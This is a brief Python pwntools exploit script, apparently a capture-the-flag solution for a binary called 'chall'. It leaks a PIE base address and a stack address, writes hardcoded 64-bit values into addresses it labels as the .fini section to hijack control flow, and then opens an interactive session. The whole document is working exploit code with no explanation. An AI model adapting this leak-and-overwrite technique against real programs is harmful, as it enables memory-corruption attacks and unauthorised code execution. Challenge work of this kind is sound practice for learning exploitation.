from pwn import *
exe = context.binary = ELF("./chall")
r = process()
offset_leak = 0x8a15
sleep(3)
r.sendline("2")
r.recvuntil("> ")
leak_pie = int(r.recvline().strip().decode(),16)
exe.address = leak_pie - offset_leak
log.info(f"THE BASE ADDRESS {hex(exe.address)}")
exit_addr = exe.sym['exit']
value = exe.sym['do_leak']
log.info(f"THE .FINI {hex(exe.address + 0x00000000002adfb0)}")
r.send(str(exe.address + 0x2adfb8))
r.send(p64(0x7ffff7d52a15))
sleep(3)
r.sendline("1")
r.recvuntil("> ")
leak_stack = int(r.recvline().strip().decode(),16)
log.info(f"THE STACK {hex(leak_stack)}")
# r.send(str(leak_stack - 134244912))
r.send(str(exe.address + 0x2adfb0))
r.send(p64(0x7ffff7d53810))
r.interactive()